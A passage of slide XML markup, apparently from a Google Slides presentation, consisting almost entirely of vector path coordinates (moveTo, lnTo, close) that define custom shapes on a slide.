                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6274" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6274" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2129" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881"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6" name="Google Shape;316;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6335525" y="1405350"/>
              <a:ext cx="442025" cy="375100"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="17681" h="15004" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="6823" y="1981"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6676" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="1981"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5282" y="2641"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5209" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="2641"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6786" y="3559"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6640" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="3559"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4806" y="5979"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4622" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="5979"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4219" y="4916"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4219" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="4916"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11628" y="7190"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11958" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="7190"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4329" y="4402"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4255" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="4402"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1761" y="7447"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1908" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="7447"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14233" y="7630"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14159" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="7630"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7410" y="6236"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7300" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="6236"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1651" y="6897"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1578" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="6897"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14306" y="7227"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14453" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14636" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
